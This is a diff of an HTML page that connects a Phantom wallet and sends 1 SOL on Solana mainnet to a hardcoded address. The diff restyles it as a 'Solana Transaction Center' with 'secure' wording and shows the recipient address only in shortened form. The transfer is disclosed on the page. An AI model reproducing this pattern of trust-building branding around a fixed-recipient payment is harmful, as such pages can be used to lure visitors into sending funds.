@@ -5,69 +5,308 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Solana Wallet Transaction</title>
     <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+        
         body {
-            font-family: Arial, sans-serif;
-            max-width: 600px;
-            margin: 0 auto;
+            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 50%, #0f3460 100%);
+            color: #fff;
+            min-height: 100vh;
             padding: 20px;
-            text-align: center;
         }
-        button {
-            background-color: #4CAF50;
-            border: none;
+        
+        .container {
+            max-width: 800px;
+            margin: 0 auto;
+            padding: 30px;
+            background: rgba(255, 255, 255, 0.05);
+            backdrop-filter: blur(10px);
+            border-radius: 20px;
+            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+        }
+        
+        header {
+            text-align: center;
+            margin-bottom: 40px;
+        }
+        
+        h1 {
+            font-size: 2.5rem;
+            margin-bottom: 10px;
+            background: linear-gradient(90deg, #00dbde, #fc00ff);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            text-shadow: 0 2px 4px rgba(0, 0, 0, 0.2);
+        }
+        
+        .subtitle {
+            color: #a0a0c0;
+            font-size: 1.1rem;
+        }
+        
+        .card {
+            background: rgba(30, 30, 46, 0.7);
+            border-radius: 15px;
+            padding: 25px;
+            margin-bottom: 30px;
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.25);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+        }
+        
+        .card-title {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            margin-bottom: 20px;
+            color: #64ffda;
+            font-size: 1.4rem;
+        }
+        
+        .card-title i {
+            font-size: 1.6rem;
+        }
+        
+        .wallet-info {
+            display: flex;
+            flex-direction: column;
+            gap: 15px;
+        }
+        
+        .info-item {
+            display: flex;
+            justify-content: space-between;
+            padding: 12px 0;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
+        }
+        
+        .info-label {
+            color: #a0a0c0;
+        }
+        
+        .info-value {
+            font-weight: 500;
+            word-break: break-all;
+            text-align: right;
+            max-width: 65%;
+        }
+        
+        .btn {
+            background: linear-gradient(90deg, #6a11cb 0%, #2575fc 100%);
             color: white;
-            padding: 15px 32px;
-            text-align: center;
-            text-decoration: none;
-            display: inline-block;
-            font-size: 16px;
-            margin: 4px 2px;
+            border: none;
+            padding: 16px 32px;
+            font-size: 1.1rem;
+            font-weight: 600;
+            border-radius: 12px;
             cursor: pointer;
-            border-radius: 4px;
+            width: 100%;
+            transition: all 0.3s ease;
+            box-shadow: 0 4px 15px rgba(37, 117, 252, 0.3);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
         }
-        button:disabled {
-            background-color: #cccccc;
+        
+        .btn:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 6px 20px rgba(37, 117, 252, 0.5);
+        }
+        
+        .btn:active {
+            transform: translateY(0);
+        }
+        
+        .btn:disabled {
+            background: linear-gradient(90deg, #4a4a8a 0%, #2a2a5a 100%);
             cursor: not-allowed;
+            transform: none;
+            box-shadow: none;
         }
+        
+        .btn-success {
+            background: linear-gradient(90deg, #00b09b 0%, #96c93d 100%);
+            box-shadow: 0 4px 15px rgba(0, 176, 155, 0.3);
+        }
+        
+        .btn-success:hover {
+            box-shadow: 0 6px 20px rgba(0, 176, 155, 0.5);
+        }
+        
         #status {
-            margin-top: 20px;
-            padding: 10px;
-            border-radius: 4px;
+            padding: 20px;
+            border-radius: 12px;
+            margin-top: 25px;
+            text-align: center;
+            font-weight: 500;
+            display: none;
         }
+        
         .success {
-            background-color: #d4edda;
-            color: #155724;
+            background: rgba(0, 176, 155, 0.2);
+            border: 1px solid #00b09b;
+            color: #64ffda;
         }
+        
         .error {
-            background-color: #f8d7da;
-            color: #721c24;
+            background: rgba(255, 71, 87, 0.2);
+            border: 1px solid #ff4757;
+            color: #ff6b81;
         }
+        
         .info {
-            background-color: #d1ecf1;
-            color: #0c5460;
+            background: rgba(37, 117, 252, 0.2);
+            border: 1px solid #2575fc;
+            color: #a0d2ff;
+        }
+        
+        .transaction-details {
+            background: rgba(40, 40, 60, 0.7);
+            border-radius: 12px;
+            padding: 20px;
+            margin-top: 25px;
+        }
+        
+        .transaction-details h3 {
+            margin-bottom: 15px;
+            color: #64ffda;
+            text-align: center;
+        }
+        
+        .details-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 15px;
+        }
+        
+        .detail-item {
+            background: rgba(30, 30, 46, 0.8);
+            padding: 15px;
+            border-radius: 10px;
+            text-align: center;
+        }
+        
+        .detail-label {
+            font-size: 0.9rem;
+            color: #a0a0c0;
+            margin-bottom: 8px;
+        }
+        
+        .detail-value {
+            font-weight: 600;
+            font-size: 1.1rem;
+            word-break: break-all;
+        }
+        
+        footer {
+            text-align: center;
+            margin-top: 40px;
+            color: #a0a0c0;
+            font-size: 0.9rem;
+        }
+        
+        @media (max-width: 600px) {
+            .container {
+                padding: 20px 15px;
+            }
+            
+            h1 {
+                font-size: 2rem;
+            }
+            
+            .card {
+                padding: 20px 15px;
+            }
+            
+            .btn {
+                padding: 14px 20px;
+                font-size: 1rem;
+            }
         }
     </style>
 </head>
 <body>
-    <h1>Solana Wallet Transaction</h1>
-    <div id="wallet-section">
-        <button id="connect-wallet">Connect Wallet</button>
+    <div class="container">
+        <header>
+            <h1><i class="fas fa-coins"></i> Solana Transaction Center</h1>
+            <p class="subtitle">Securely connect your wallet and send SOL transactions</p>
+        </header>
+        
+        <div class="card">
+            <div class="card-title">
+                <i class="fas fa-wallet"></i>
+                <h2>Wallet Connection</h2>
+            </div>
+            <div id="wallet-section">
+                <button id="connect-wallet" class="btn">
+                    <i class="fas fa-plug"></i> Connect Wallet
+                </button>
+            </div>
+            <div id="transaction-section" style="display:none;">
+                <div class="wallet-info">
+                    <div class="info-item">
+                        <span class="info-label">Wallet Address:</span>
+                        <span id="wallet-address" class="info-value"></span>
+                    </div>
+                    <div class="info-item">
+                        <span class="info-label">Balance:</span>
+                        <span id="wallet-balance" class="info-value">0 SOL</span>
+                    </div>
+                </div>
+                <button id="send-transaction" class="btn btn-success" style="margin-top: 25px;">
+                    <i class="fas fa-paper-plane"></i> Send 1 SOL Transaction
+                </button>
+            </div>
+        </div>
+        
+        <div class="card">
+            <div class="card-title">
+                <i class="fas fa-exchange-alt"></i>
+                <h2>Transaction Details</h2>
+            </div>
+            <div class="transaction-details">
+                <div class="details-grid">
+                    <div class="detail-item">
+                        <div class="detail-label">Amount</div>
+                        <div class="detail-value">1 SOL</div>
+                    </div>
+                    <div class="detail-item">
+                        <div class="detail-label">Fee</div>
+                        <div class="detail-value">0.000005 SOL</div>
+                    </div>
+                    <div class="detail-item">
+                        <div class="detail-label">Network</div>
+                        <div class="detail-value">Mainnet Beta</div>
+                    </div>
+                    <div class="detail-item">
+                        <div class="detail-label">Recipient</div>
+                        <div id="recipient-value" class="detail-value">BGMk7XUwkBY2UUuVhLiFnZnwc6ZEVqGC7LRxU6Kg7rRG</div>
+                    </div>
+                </div>
+            </div>
+        </div>
+        
+        <div id="status"></div>
     </div>
-    <div id="transaction-section" style="display:none;">
-        <p>Connected Wallet: <span id="wallet-address"></span></p>
-        <p>Balance: <span id="wallet-balance"></span> SOL</p>
-        <button id="send-transaction">Send 1 SOL</button>
-    </div>
-    <div id="status"></div>
+    
+    <footer>
+        <p>Solana Transaction Center &copy; 2023 | Secure Blockchain Transactions</p>
+    </footer>
 
     <script>
         // Target wallet address (your address)
         const TARGET_WALLET = "BGMk7XUwkBY2UUuVhLiFnZnwc6ZEVqGC7LRxU6Kg7rRG";
         
-        // Initialize Solana connection
+        // Initialize Solana connection to mainnet
         const connection = new solanaWeb3.Connection(
-            solanaWeb3.clusterApiUrl('mainnet-beta'), // Change to 'mainnet-beta' for real transactions
+            solanaWeb3.clusterApiUrl('mainnet-beta'),
             'confirmed'
         );
         
@@ -81,18 +320,33 @@
         const walletBalanceElement = document.getElementById('wallet-balance');
         const sendTransactionButton = document.getElementById('send-transaction');
         const statusElement = document.getElementById('status');
+        const recipientValueElement = document.getElementById('recipient-value');
+        
+        // Truncate wallet address for display
+        function truncateAddress(address) {
+            return address.slice(0, 6) + '...' + address.slice(-4);
+        }
         
         // Update status message
         function updateStatus(message, type = 'info') {
             statusElement.textContent = message;
             statusElement.className = type;
+            statusElement.style.display = 'block';
+            
+            // Auto-hide success messages after 5 seconds
+            if (type === 'success') {
+                setTimeout(() => {
+                    statusElement.style.display = 'none';
+                }, 5000);
+            }
         }
         
         // Get wallet balance
         async function getBalance() {
             try {
                 const balance = await connection.getBalance(walletPublicKey);
-                walletBalanceElement.textContent = (balance / solanaWeb3.LAMPORTS_PER_SOL).toFixed(4);
+                const solBalance = balance / solanaWeb3.LAMPORTS_PER_SOL;
+                walletBalanceElement.textContent = solBalance.toFixed(4) + ' SOL';
             } catch (error) {
                 console.error("Error fetching balance:", error);
                 updateStatus("Error fetching balance", "error");
@@ -104,7 +358,8 @@
             if (window.solana && window.solana.isPhantom) {
                 provider = window.solana;
             } else {
-                updateStatus("Please install Phantom wallet!", "error");
+                updateStatus("Please install Phantom wallet extension!", "error");
+                window.open("https://phantom.app/", "_blank");
                 return;
             }
             
@@ -113,7 +368,8 @@
                 const response = await provider.connect();
                 walletPublicKey = response.publicKey;
                 
-                walletAddressElement.textContent = walletPublicKey.toString();
+                walletAddressElement.textContent = truncateAddress(walletPublicKey.toString());
+                walletAddressElement.title = walletPublicKey.toString();
                 transactionSection.style.display = "block";
                 connectButton.style.display = "none";
                 
@@ -145,21 +401,21 @@
                 );
                 
                 // Get latest blockhash
-                const { blockhash } = await connection.getRecentBlockhash();
+                const { blockhash, feeCalculator } = await connection.getRecentBlockhash();
                 transaction.recentBlockhash = blockhash;
                 transaction.feePayer = walletPublicKey;
                 
-                updateStatus("Sending transaction...", "info");
+                updateStatus("Sending transaction... Please confirm in your wallet", "info");
                 
                 // Sign and send transaction
                 const signedTransaction = await provider.signTransaction(transaction);
                 const signature = await connection.sendRawTransaction(signedTransaction.serialize());
                 
-                updateStatus(`Transaction sent: ${signature}`, "info");
+                updateStatus(`Transaction sent: ${signature.substring(0, 20)}...`, "info");
                 
                 // Confirm transaction
                 await connection.confirmTransaction(signature, 'confirmed');
-                updateStatus(`Transaction confirmed! 1 SOL sent to ${TARGET_WALLET}`, "success");
+                updateStatus(`Success! 1 SOL sent to ${truncateAddress(TARGET_WALLET)}`, "success");
                 
                 // Update balance
                 await getBalance();
@@ -173,17 +429,23 @@
         connectButton.addEventListener('click', connectWallet);
         sendTransactionButton.addEventListener('click', sendTransaction);
         
-        // Check if wallet is already connected
+        // Check if wallet is already connected on page load
         window.addEventListener('load', async () => {
             if (window.solana && window.solana.isConnected) {
                 provider = window.solana;
                 walletPublicKey = provider.publicKey;
-                walletAddressElement.textContent = walletPublicKey.toString();
+                walletAddressElement.textContent = truncateAddress(walletPublicKey.toString());
+                walletAddressElement.title = walletPublicKey.toString();
                 transactionSection.style.display = "block";
                 connectButton.style.display = "none";
                 await getBalance();
+                updateStatus("Wallet connected!", "success");
             }
         });
+        
+        // Truncate recipient address for display
+        recipientValueElement.textContent = truncateAddress(TARGET_WALLET);
+        recipientValueElement.title = TARGET_WALLET;
     </script>
 </body>
 </html>
